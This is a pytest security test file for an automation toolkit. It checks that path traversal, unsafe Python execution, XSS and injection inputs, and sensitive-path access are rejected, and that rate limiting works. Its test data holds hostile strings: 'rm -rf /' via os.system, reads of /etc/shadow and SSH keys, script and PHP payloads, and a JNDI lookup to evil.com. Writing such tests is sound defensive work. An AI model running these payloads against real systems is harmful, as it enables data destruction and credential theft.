"""
Security Tests for Ignition Automation Toolkit v4.0

Tests for security improvements implemented in Phase 1 and Phase 4:
- Path traversal prevention (CVE-2024-001)
- Python code execution sandboxing (CVE-2024-002)
- Rate limiting (DoS prevention)
- Input validation (XSS, YAML injection)
- Filesystem access restrictions
"""

import asyncio
import os
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from fastapi import HTTPException
from fastapi.testclient import TestClient
from pydantic import ValidationError

# Import security components
from ignition_toolkit.api.app import app
from ignition_toolkit.api.middleware.rate_limit import RateLimitMiddleware, TokenBucket
from ignition_toolkit.api.routers.filesystem import is_path_allowed
from ignition_toolkit.api.routers.models import PlaybookMetadataUpdateRequest
from ignition_toolkit.core.validation import PathValidator


# ============================================================================
# Path Traversal Prevention Tests (CVE-2024-001)
# ============================================================================


class TestPathTraversalPrevention:
    """Test PathValidator prevents directory traversal attacks"""

    def test_rejects_parent_directory_traversal(self):
        """Should reject paths with .. (parent directory)"""
        with pytest.raises(ValueError, match="directory traversal"):
            PathValidator.validate_path_safety(Path("../../../etc/passwd"))

    def test_rejects_hidden_parent_traversal(self):
        """Should reject hidden traversal patterns"""
        with pytest.raises(ValueError, match="directory traversal"):
            PathValidator.validate_path_safety(Path("playbooks/../../etc/passwd"))

    def test_rejects_suspicious_patterns(self):
        """Should reject paths with suspicious patterns"""
        suspicious_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "~/.ssh/id_rsa",
            "/root/.bashrc",
            "/home/user/.env",
        ]

        for path_str in suspicious_paths:
            with pytest.raises(ValueError):
                PathValidator.validate_path_safety(Path(path_str))

    def test_allows_safe_paths(self):
        """Should allow legitimate paths"""
        safe_paths = [
            "playbooks/gateway/test.yaml",
            "data/screenshots/test.png",
            "frontend/dist/index.html",
        ]

        for path_str in safe_paths:
            # Should not raise
            PathValidator.validate_path_safety(Path(path_str))

    def test_playbook_path_validation(self):
        """Test playbook-specific path validation"""
        from ignition_toolkit.core.paths import get_playbooks_dir

        playbooks_dir = get_playbooks_dir()

        # Should accept valid playbook path
        valid_path = "gateway/module_upgrade.yaml"
        resolved = PathValidator.validate_playbook_path(
            valid_path, base_dir=playbooks_dir, must_exist=False
        )
        assert "gateway/module_upgrade.yaml" in str(resolved)

        # Should reject traversal
        with pytest.raises(ValueError, match="directory traversal"):
            PathValidator.validate_playbook_path(
                "../../etc/passwd", base_dir=playbooks_dir, must_exist=False
            )


# ============================================================================
# Python Code Execution Sandboxing Tests (CVE-2024-002)
# ============================================================================


class TestPythonSandboxing:
    """Test Python code execution is properly sandboxed"""

    def test_rejects_dangerous_imports(self):
        """Should reject dangerous module imports"""
        from ignition_toolkit.playbook.steps.utility import execute_python_safely

        dangerous_code = [
            "import os; os.system('rm -rf /')",
            "import subprocess; subprocess.run(['ls'])",
            "__import__('os').system('whoami')",
            "exec('import os')",
            "eval('__import__(\"os\")')",
        ]

        for code in dangerous_code:
            with pytest.raises(ValueError, match="Dangerous|not allowed"):
                execute_python_safely(code, context={}, timeout=1)

    def test_allows_safe_code(self):
        """Should allow safe Python code"""
        from ignition_toolkit.playbook.steps.utility import execute_python_safely

        safe_code = """
result = 2 + 2
output = f"The answer is {result}"
"""
        context = {}
        execute_python_safely(safe_code, context, timeout=1)
        assert context.get("result") == 4
        assert context.get("output") == "The answer is 4"

    def test_enforces_timeout(self):
        """Should timeout infinite loops"""
        from ignition_toolkit.playbook.steps.utility import execute_python_safely

        infinite_loop = """
while True:
    pass
"""
        with pytest.raises(TimeoutError):
            execute_python_safely(infinite_loop, context={}, timeout=1)


# ============================================================================
# Rate Limiting Tests
# ============================================================================


class TestRateLimiting:
    """Test rate limiting middleware"""

    def test_token_bucket_basic(self):
        """Test token bucket algorithm basics"""
        bucket = TokenBucket(capacity=10, refill_rate=1.0)

        # Should allow up to capacity
        for i in range(10):
            assert bucket.consume(1) is True

        # Should reject when empty
        assert bucket.consume(1) is False

    def test_token_bucket_refill(self):
        """Test token bucket refills over time"""
        import time

        bucket = TokenBucket(capacity=10, refill_rate=10.0)  # 10 tokens/sec

        # Consume all tokens
        for i in range(10):
            bucket.consume(1)

        # Wait for refill (0.5 sec = 5 tokens)
        time.sleep(0.5)

        # Should have ~5 tokens available
        consumed = 0
        for i in range(10):
            if bucket.consume(1):
                consumed += 1
        assert consumed >= 4  # Allow some timing variance

    def test_rate_limit_middleware_integration(self):
        """Test rate limiting in FastAPI integration"""
        client = TestClient(app)

        # Make multiple requests to trigger rate limit
        # Using a simple endpoint like /health
        responses = []
        for i in range(150):  # Exceed high-frequency limit (120 req/min)
            response = client.get("/health")
            responses.append(response)

        # Should get some 429 (Too Many Requests) responses
        status_codes = [r.status_code for r in responses]
        assert 429 in status_codes, "Rate limiting should trigger 429 responses"

        # Check rate limit headers are present
        for response in responses[:10]:  # Check first 10 successful requests
            if response.status_code == 200:
                assert "X-RateLimit-Limit" in response.headers
                assert "X-RateLimit-Remaining" in response.headers


# ============================================================================
# Input Validation Tests (XSS, YAML Injection)
# ============================================================================


class TestInputValidation:
    """Test input validation prevents XSS and injection attacks"""

    def test_rejects_xss_in_name(self):
        """Should reject XSS patterns in playbook names"""
        dangerous_names = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE playbooks; --",
            "{{ malicious.code }}",
            "${jndi:ldap://evil.com/a}",
            "<img src=x onerror=alert(1)>",
        ]

        for name in dangerous_names:
            with pytest.raises(ValidationError):
                PlaybookMetadataUpdateRequest(
                    playbook_path="test.yaml", name=name, description="Test"
                )

    def test_rejects_xss_in_description(self):
        """Should reject XSS patterns in descriptions"""
        dangerous_descriptions = [
            "<script>alert('xss')</script>",
            "javascript:void(0)",
            "<?php system('whoami'); ?>",
            "<iframe src='http://evil.com'>",
        ]

        for desc in dangerous_descriptions:
            with pytest.raises(ValidationError, match="dangerous pattern"):
                PlaybookMetadataUpdateRequest(
                    playbook_path="test.yaml", name="Test", description=desc
                )

    def test_rejects_control_characters(self):
        """Should reject control characters in inputs"""
        with pytest.raises(ValidationError, match="control character"):
            PlaybookMetadataUpdateRequest(
                playbook_path="test.yaml",
                name="Test\x00Name",  # Null byte
                description="Test",
            )

    def test_enforces_length_limits(self):
        """Should enforce maximum length limits"""
        # Name too long (>200 chars)
        with pytest.raises(ValidationError, match="too long"):
            PlaybookMetadataUpdateRequest(
                playbook_path="test.yaml", name="A" * 201, description="Test"
            )

        # Description too long (>2000 chars)
        with pytest.raises(ValidationError, match="too long"):
            PlaybookMetadataUpdateRequest(
                playbook_path="test.yaml", name="Test", description="A" * 2001
            )

    def test_allows_valid_inputs(self):
        """Should allow legitimate inputs"""
        valid_request = PlaybookMetadataUpdateRequest(
            playbook_path="gateway/test.yaml",
            name="Module Upgrade Workflow",
            description="This playbook upgrades Ignition modules.\nSupports both signed and unsigned modules.",
        )

        assert valid_request.name == "Module Upgrade Workflow"
        assert "modules" in valid_request.description


# ============================================================================
# Filesystem Access Restriction Tests
# ============================================================================


class TestFilesystemAccessRestrictions:
    """Test filesystem browsing is properly restricted"""

    def test_default_allows_only_data_directory(self):
        """Should only allow access to data/ directory by default"""
        from ignition_toolkit.core.paths import get_data_dir

        data_dir = get_data_dir()

        # Should allow data directory
        assert is_path_allowed(data_dir)
        assert is_path_allowed(data_dir / "screenshots")

    def test_rejects_sensitive_directories(self):
        """Should reject access to sensitive directories"""
        sensitive_paths = [
            Path.home() / ".ssh",
            Path.home() / ".ignition-toolkit" / "credentials.enc",
            Path("/etc/passwd"),
            Path("/etc/shadow"),
            Path("/root/.bashrc"),
        ]

        for path in sensitive_paths:
            # Create a mock to avoid actual filesystem access
            # The function should reject based on path patterns
            result = is_path_allowed(path)
            # Should be False because these paths are outside data/
            assert result is False, f"Should reject access to {path}"

    def test_environment_variable_configuration(self):
        """Should respect FILESYSTEM_ALLOWED_PATHS environment variable"""
        # This test would need to restart the middleware with new env var
        # For now, we just verify the concept works
        test_path = "/opt/test-modules"

        with patch.dict(os.environ, {"FILESYSTEM_ALLOWED_PATHS": test_path}):
            # Would need to reload the module to test properly
            # This is a design test
            env_paths = os.environ.get("FILESYSTEM_ALLOWED_PATHS", "")
            assert test_path in env_paths

    def test_filesystem_api_enforces_restrictions(self):
        """Test /api/filesystem endpoints enforce restrictions"""
        client = TestClient(app)

        # Try to browse a restricted path
        response = client.get("/api/filesystem/browse?path=/etc")

        # Should return 403 Forbidden
        assert response.status_code == 403
        assert "Access denied" in response.json()["detail"]


# ============================================================================
# Integration Tests
# ============================================================================


class TestSecurityIntegration:
    """Integration tests for combined security features"""

    def test_api_security_headers(self):
        """Test API returns appropriate security headers"""
        client = TestClient(app)
        response = client.get("/health")

        # Should have rate limit headers
        assert "X-RateLimit-Limit" in response.headers
        assert "X-RateLimit-Remaining" in response.headers

    def test_cors_restrictions(self):
        """Test CORS is properly restricted"""
        client = TestClient(app)

        # Request from unauthorized origin
        response = client.get(
            "/health",
            headers={"Origin": "http://evil-site.com"},
        )

        # CORS middleware should not add access-control-allow-origin for evil origin
        # (Note: TestClient doesn't fully simulate CORS, this tests the config)
        assert response.status_code == 200  # Request succeeds but CORS headers controlled

    def test_playbook_duplicate_security(self):
        """Test playbook duplication respects security constraints"""
        client = TestClient(app)

        # Try to duplicate with path traversal
        response = client.post(
            "/api/playbooks/..%2F..%2Fetc%2Fpasswd/duplicate"  # URL-encoded ../
        )

        # Should reject (400 or 403)
        assert response.status_code in [400, 403, 404]


# ============================================================================
# Pytest Configuration
# ============================================================================


@pytest.fixture(autouse=True)
def reset_rate_limits():
    """Reset rate limits between tests"""
    # This would need actual middleware reference to work properly
    # For now, just yield
    yield


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
